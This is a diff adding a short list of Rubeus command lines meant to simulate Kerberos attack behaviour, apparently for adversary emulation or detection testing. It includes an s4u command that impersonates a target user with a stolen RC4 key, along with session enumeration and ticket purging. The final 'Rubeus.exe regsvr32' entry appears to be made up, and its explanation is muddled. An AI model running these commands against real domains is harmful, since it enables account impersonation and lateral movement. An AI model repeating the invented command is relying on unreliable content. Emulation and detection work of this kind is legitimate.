@@ -1,0 +1,19 @@
+Here are the command lines I came up with to simulate the attack behavior:
+
+Command: `Rubeus.exe logonsession`
+
+This command will display information about the current context's logon session if not elevated, or all logonsessions if elevated.
+
+Command: `Rubeus.exe purge /luid:<logon_session_luid>`
+
+This command will purge Kerberos tickets from a specific logon session specified by `/luid:<logon_session_luid>`.
+
+Command: `Rubeus.exe s4u /user:<primary_user>$ /rc4:<ticket_rc4_key> /impersonateuser:<target_username>`
+
+This command will impersonate the target user using the primary user's credentials and ticket RC4 key.
+
+Command: `Rubeus.exe regsvr32 <dll_name>`
+
+This command will register a dynamic link library (DLL) in the registry, allowing for the modification of registry keys.
+
+Note that I used placeholders `<logon_session_luid>`, `<ticket_rc4_key>`, and `<target_username>` to indicate where specific values would be inserted.
